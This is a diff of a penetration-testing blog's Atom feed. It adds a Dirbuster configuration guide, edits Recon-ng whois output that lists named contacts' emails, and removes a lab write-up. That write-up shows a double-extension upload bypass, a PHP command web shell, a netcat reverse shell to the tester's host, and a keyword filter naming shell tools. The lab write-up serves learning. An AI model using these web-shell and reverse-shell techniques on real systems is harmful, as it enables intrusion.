@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-08-29T16:20:55-04:00</updated>
+  <updated>2016-09-12T06:57:15-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,98 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest tools - Dirbuster]]></title>
+    <link href="http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster/"/>
+    <updated>2016-09-12T02:21:55-04:00</updated>
+    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
+    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>
+
+<!-- more -->
+
+
+<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>
+
+<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster.png" title="&lsquo;dirbuster&rsquo; &lsquo;dirbuster interface&rsquo;" ></p>
+
+<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>
+
+<h1>Dirbuster configuration</h1>
+
+<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-lists.png" title="&lsquo;dirbuster lists&rsquo; &lsquo;dirbuster default lists&rsquo;" ></p>
+
+<ul>
+<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
+<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
+</ul>
+
+
+<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>
+
+<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>
+
+<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>
+
+<h2>Dirbuster Options</h2>
+
+<p>In the Options tab, you can further tweak your Dirbuster installation.</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-options.png" title="&lsquo;dirbuster options&rsquo; &lsquo;dirbuster options&rsquo;" ></p>
+
+<ul>
+<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
+<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
+</ul>
+
+
+<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>
+
+<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-html.png" title="&lsquo;dirbuster html options&rsquo; &lsquo;dirbuster html parsing&rsquo;" ></p>
+
+<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-http.png" title="&lsquo;dirbuster http options&rsquo; &lsquo;dirbuster http options&rsquo;" ></p>
+
+<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-scan.png" title="&lsquo;dirbuster scan options&rsquo; &lsquo;dirbuster scan options&rsquo;" ></p>
+
+<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-results.png" title="&lsquo;dirbuster scan results&rsquo; &lsquo;dirbuster scan results&rsquo;" ></p>
+
+<p>You can also see the results in a tree view, for better readability:</p>
+
+<p><img class="center" src="/images/tools/dirbuster/dirbuster-tree.png" title="&lsquo;dirbuster tree&rsquo; &lsquo;dirbuster tree results&rsquo;" ></p>
+
+<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>
+
+<p>``` plain</p>
+
+<hr />
+
+<p>/ Fine day for friends. So-so day for \
+\ you.                                /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest tools - Recon-ng]]></title>
@@ -27,7 +119,7 @@
 
 <p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>
 
-<p><img class="center" src="/images/tools/recon/recon-ng.png" title="&lsquo;recon-ng&rsquo; &lsquo;recon-ng&rsquo;" ></p>
+<p><img class="center" src="/images/tools/recon-ng.png" title="&lsquo;recon-ng&rsquo; &lsquo;recon-ng&rsquo;" ></p>
 
 <h1>Recon-ng core commands</h1>
 
@@ -381,9 +473,9 @@ given company search string. Updates the respective tables with the results.</p>
 [<em>] Netblock: 64.56.197.208/28
 [</em>] Netblock: 67.72.118.0/23
 [<em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/pocs">http://whois.arin.net/rest/org/YAHOO-1/pocs</a>
-[</em>] Contact: Netblock Admin (<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#110;&#x65;&#116;&#98;&#x6c;&#x6f;&#99;&#107;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x79;&#x61;&#x68;&#x6f;&#111;&#45;&#x69;&#110;&#x63;&#x2e;&#99;&#111;&#x6d;">&#110;&#x65;&#x74;&#x62;&#x6c;&#111;&#99;&#x6b;&#97;&#x64;&#x6d;&#105;&#110;&#64;&#x79;&#x61;&#104;&#x6f;&#x6f;&#45;&#105;&#110;&#99;&#x2e;&#99;&#111;&#109;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
-[<em>] Contact: Netblock Admin (<a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#110;&#101;&#116;&#98;&#x6c;&#111;&#99;&#107;&#97;&#100;&#109;&#x69;&#x6e;&#64;&#x79;&#97;&#104;&#x6f;&#x6f;&#x2d;&#105;&#x6e;&#x63;&#46;&#99;&#111;&#109;">&#110;&#x65;&#x74;&#x62;&#108;&#x6f;&#x63;&#107;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#121;&#x61;&#104;&#x6f;&#111;&#45;&#x69;&#x6e;&#x63;&#46;&#99;&#111;&#109;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
-[</em>] Contact: Network Abuse (<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#97;&#98;&#117;&#x73;&#101;&#64;&#x79;&#x61;&#x68;&#111;&#x6f;&#x2d;&#x69;&#x6e;&#99;&#x2e;&#99;&#111;&#x6d;">&#x61;&#98;&#x75;&#115;&#101;&#x40;&#121;&#x61;&#104;&#x6f;&#x6f;&#x2d;&#x69;&#x6e;&#x63;&#46;&#x63;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>
+[</em>] Contact: Netblock Admin (<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x6e;&#101;&#116;&#x62;&#x6c;&#x6f;&#x63;&#x6b;&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#121;&#x61;&#x68;&#111;&#111;&#x2d;&#x69;&#x6e;&#99;&#46;&#x63;&#111;&#109;">&#x6e;&#x65;&#116;&#98;&#108;&#x6f;&#99;&#x6b;&#97;&#x64;&#109;&#x69;&#110;&#64;&#x79;&#x61;&#104;&#x6f;&#x6f;&#45;&#x69;&#x6e;&#99;&#46;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
+[<em>] Contact: Netblock Admin (<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#110;&#101;&#116;&#x62;&#x6c;&#111;&#99;&#x6b;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#121;&#x61;&#104;&#x6f;&#x6f;&#45;&#105;&#x6e;&#99;&#46;&#99;&#111;&#x6d;">&#110;&#101;&#x74;&#x62;&#x6c;&#x6f;&#x63;&#107;&#97;&#100;&#109;&#105;&#110;&#x40;&#x79;&#x61;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#x6e;&#99;&#46;&#x63;&#x6f;&#109;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
+[</em>] Contact: Network Abuse (<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x61;&#98;&#117;&#x73;&#101;&#64;&#x79;&#97;&#104;&#x6f;&#111;&#45;&#105;&#x6e;&#x63;&#x2e;&#99;&#x6f;&#109;">&#97;&#x62;&#x75;&#115;&#x65;&#x40;&#x79;&#x61;&#104;&#x6f;&#111;&#45;&#x69;&#110;&#99;&#46;&#99;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>
 
 <hr />
 
@@ -393,9 +485,9 @@ given company search string. Updates the respective tables with the results.</p>
 [</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/nets">http://whois.arin.net/rest/org/YAHOO-10/nets</a>
 [<em>] Netblock: 12.23.247.176/29
 [</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/pocs">http://whois.arin.net/rest/org/YAHOO-10/pocs</a>
-[<em>] Contact: Janice Kilburn (<a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#106;&#x6b;&#x69;&#108;&#98;&#x75;&#x72;&#x6e;&#x31;&#x73;&#116;&#x6f;&#112;&#x40;&#121;&#x61;&#104;&#x6f;&#111;&#x2e;&#99;&#111;&#109;">&#x6a;&#107;&#x69;&#x6c;&#98;&#x75;&#x72;&#110;&#x31;&#115;&#x74;&#111;&#112;&#64;&#x79;&#x61;&#x68;&#111;&#x6f;&#x2e;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
-[</em>] Contact: Janice Kilburn (<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#107;&#x69;&#x6c;&#98;&#117;&#114;&#x6e;&#49;&#x73;&#x74;&#x6f;&#x70;&#x40;&#121;&#97;&#104;&#x6f;&#x6f;&#x2e;&#99;&#111;&#109;">&#106;&#107;&#105;&#x6c;&#x62;&#117;&#114;&#110;&#49;&#115;&#116;&#x6f;&#112;&#64;&#x79;&#x61;&#104;&#111;&#111;&#x2e;&#99;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
-[<em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#x6b;&#105;&#x6c;&#98;&#x75;&#x72;&#110;&#49;&#x73;&#x74;&#111;&#112;&#x40;&#121;&#x61;&#x68;&#111;&#111;&#x2e;&#x63;&#111;&#x6d;">&#x6a;&#107;&#105;&#108;&#98;&#x75;&#x72;&#x6e;&#49;&#x73;&#x74;&#111;&#x70;&#x40;&#x79;&#97;&#x68;&#x6f;&#x6f;&#x2e;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
+[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#x6b;&#x69;&#108;&#98;&#x75;&#x72;&#x6e;&#x31;&#115;&#116;&#x6f;&#x70;&#64;&#121;&#97;&#x68;&#x6f;&#111;&#x2e;&#x63;&#x6f;&#109;">&#106;&#107;&#105;&#108;&#x62;&#x75;&#114;&#x6e;&#49;&#115;&#116;&#111;&#112;&#64;&#x79;&#x61;&#x68;&#x6f;&#111;&#46;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
+[</em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#107;&#105;&#x6c;&#x62;&#x75;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#112;&#x40;&#x79;&#x61;&#x68;&#x6f;&#x6f;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x6b;&#x69;&#x6c;&#98;&#117;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#112;&#x40;&#121;&#97;&#104;&#x6f;&#x6f;&#x2e;&#x63;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
+[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#106;&#107;&#x69;&#x6c;&#x62;&#x75;&#x72;&#110;&#49;&#x73;&#x74;&#111;&#112;&#64;&#x79;&#97;&#104;&#x6f;&#x6f;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#107;&#105;&#x6c;&#98;&#x75;&#x72;&#110;&#49;&#x73;&#x74;&#x6f;&#112;&#64;&#x79;&#97;&#x68;&#111;&#x6f;&#x2e;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
 [</em>] URL: <a href="http://whois.arin.net/rest/customers;name=yahoo">http://whois.arin.net/rest/customers;name=yahoo</a></p>
 
 <hr />
@@ -1838,231 +1930,6 @@ mr.pr0n || p0wnbox.Team || 2011
 </code></pre>
 
 <p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
-    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
-    <updated>2016-06-12T11:51:50-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
-    <content type="html"><![CDATA[<h1>Mission statement</h1>
-
-<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>
-
-<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>
-
-<!-- more -->
-
-
-<h1>Recon</h1>
-
-<p>Started with an Nmap scan, I only keep here the relevant output:</p>
-
-<p><code>plain
-PORT     STATE SERVICE REASON         VERSION
-22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
-8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))
-</code></p>
-
-<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/tripios.png" title="&lsquo;tripios&rsquo; &lsquo;tripios image hosting&rsquo;" ></p>
-
-<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
-<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>
-
-<h1>Exploit</h1>
-
-<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/upload.png" title="&lsquo;upload&rsquo; &lsquo;uploaded image&rsquo;" ></p>
-
-<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>
-
-<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>
-
-<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>
-
-<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>
-
-<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>
-
-<p>With this information, I made another simple script to see if I can get command execution on the target:</p>
-
-<p><code>php
-&lt;?php
-echo exec($_GET['cmd']);
-?&gt;
-</code></p>
-
-<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>
-
-<p><code>php
-echo exec('whoami');
-</code></p>
-
-<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>
-
-<p><code>php
-echo exec($_REQUEST['cmd']);
-</code></p>
-
-<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>
-
-<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>
-
-<p><code>plain
-root@pwnbox:~#nc -vvnlp 5555
-listening on [any] 5555 ...
-connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
-ls /home
-bob
-ls /home/bob/
-Documents
-public_html
-</code></p>
-
-<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>
-
-<p><code>plain
-ls -a /var/www
-.
-..
-.htaccess
-.proof
-image.php
-images
-index.php
-info.php
-myphp.php
-style
-upload.php
-xmm.html
-</code></p>
-
-<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>
-
-<p>``` plain
-cat .proof</p>
-
-<h6>#</h6>
-
-<h1>Drunk Admin Challenge</h1>
-
-<h1>by @anestisb</h1>
-
-<h6>#</h6>
-
-<p>bob> Great work.
-bob> Meet me there.
-&hellip;> ?
-bob> What? You don&rsquo;t know where?
-bob> Work a little more your post</p>
-
-<pre><code> exploitation skills.
-</code></pre>
-
-<p>Secret Code:
-TGglMUxecjJDSDclN1Ej</p>
-
-<p>Mail me your methods at:
-<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#97;&#x6e;&#x65;&#115;&#x74;&#x69;&#115;&#x40;&#x62;&#101;&#99;&#104;&#116;&#x73;&#x6f;&#117;&#x64;&#105;&#x73;&#46;&#x63;&#111;&#x6d;">&#97;&#x6e;&#101;&#x73;&#116;&#x69;&#115;&#x40;&#x62;&#x65;&#x63;&#104;&#x74;&#115;&#111;&#117;&#x64;&#105;&#115;&#46;&#x63;&#x6f;&#x6d;</a>
-```</p>
-
-<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>
-
-<p><code>plain
-ls /home/bob/public_html
-encrypt.php
-include
-index.php
-</code></p>
-
-<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret decryption&rsquo;" ></p>
-
-<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>
-
-<p>``` python</p>
-
-<p>import base64
-import binascii</p>
-
-<p>testme = raw_input(&ldquo;Enter string to check if base64: &rdquo;)</p>
-
-<p>try:</p>
-
-<pre><code>base64.decodestring(testme)
-print base64.decodestring(testme)
-</code></pre>
-
-<p>except binascii.Error:</p>
-
-<pre><code>print "[x] Sorry, this isn't base64"
-</code></pre>
-
-<p>```</p>
-
-<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>
-
-<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>
-
-<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/location.png" title="&lsquo;meeting location&rsquo; &lsquo;secret location&rsquo;" ></p>
-
-<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>
-
-<p>``` php
-if(isset($_POST[&lsquo;Submit&rsquo;]) &amp;&amp; !$errors) {</p>
-
-<pre><code>$file = file_get_contents("./images/$image_name");
-if( strpos($file,"perl") ||
-strpos($file,"bash") ||
-strpos($file,"sh -c") ||
-strpos($file,"python") ||
-strpos($file,"nc ") ||
-strpos($file,"netcat") ||
-strpos($file,"base64") ||
-strpos($file,"ruby") ||
-strpos($file,"fsockopen") ||
-strpos($file,"xterm") ||
-strpos($file,"gcc") ||
-strpos($file,'$_GET') ||
-strpos($file,'$_POST') ||
-strpos($file,'$_SERVER') ||
-strpos($file,'$_FILES') ||
-strpos($file,'$_COOKIE') )
-{ 
-echo "&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;"; 
-exec("rm ./images/$image_name");
-die;
-}
-</code></pre>
-
-<p>```</p>
-
-<p>Nice twist on this file upload vulnerability!</p>
-
-<h1>Report</h1>
-
-<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>
-
-<ul>
-<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
-<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
-<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
-<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
-</ul>
-
-
-<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>
-
-<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/think.png" title="&lsquo;think&rsquo; &lsquo;hmm&rsquo;" ></p>
 ]]></content>
   </entry>
   
